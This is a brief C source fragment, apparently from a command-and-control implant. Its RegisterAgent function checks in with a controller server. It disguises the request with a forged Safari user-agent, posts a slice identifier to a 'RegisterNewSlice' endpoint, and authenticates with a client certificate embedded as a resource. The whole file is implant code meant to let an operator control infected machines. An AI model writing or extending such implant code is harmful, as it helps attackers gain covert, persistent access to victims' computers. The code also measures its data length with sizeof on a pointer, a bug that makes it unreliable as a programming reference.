#include "Http.h"
#include "implant.h"
#include "LoadResource.h"

BOOL RegisterAgent() {
	Agent	new_agent		= { 0 };
	LPCWSTR UserAgent		= L"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1";
	LPCWSTR HttpEndpoint	= L"RegisterNewSlice";
	LPCWSTR HttpServer		= L"127.0.0.1";
	LPCWSTR RequestHeaders	= L"Content-Type: application/x-www-form-urlencoded";
	LPCWSTR DataBuf			= L"slice_id=Rye";
	DWORD	DataLen			= sizeof(DataBuf);


	PCCERT_CONTEXT ClientCert = { 0 };
	ClientCert = LoadCertificateFromResource(GetModuleHandleW(NULL), L"IDR_RCDATA1");
	PerformRequest(UserAgent, HttpEndpoint, HttpServer, DataBuf, DataLen, RequestHeaders, ClientCert);
	
	return 1;
}
